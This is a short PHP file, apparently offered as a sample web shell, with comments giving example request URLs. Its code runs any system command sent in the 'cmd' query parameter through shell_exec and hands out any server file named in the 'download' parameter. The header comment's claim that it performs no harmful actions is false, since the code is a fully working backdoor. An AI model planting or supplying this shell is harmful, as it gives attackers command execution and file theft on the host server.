<?php
// Your malicious code goes here
// This is a sample web shell for demonstration purposes only
// It is intentionally kept minimal and does not perform any harmful actions

// Example commands:
// - Execute system commands: http://yourwebsite.com/webshell.php?cmd=ls
// - Download files: http://yourwebsite.com/webshell.php?download=/path/to/file

// Check if the "cmd" parameter is provided
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Execute the system command and capture the output
    $output = shell_exec($command);

    // Print the output
    echo "<pre>$output</pre>";
}

// Check if the "download" parameter is provided
if (isset($_GET['download'])) {
    $file = $_GET['download'];

    // Set appropriate headers for file download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Content-Length: ' . filesize($file));

    // Read and output the file contents
    readfile($file);
}
?>
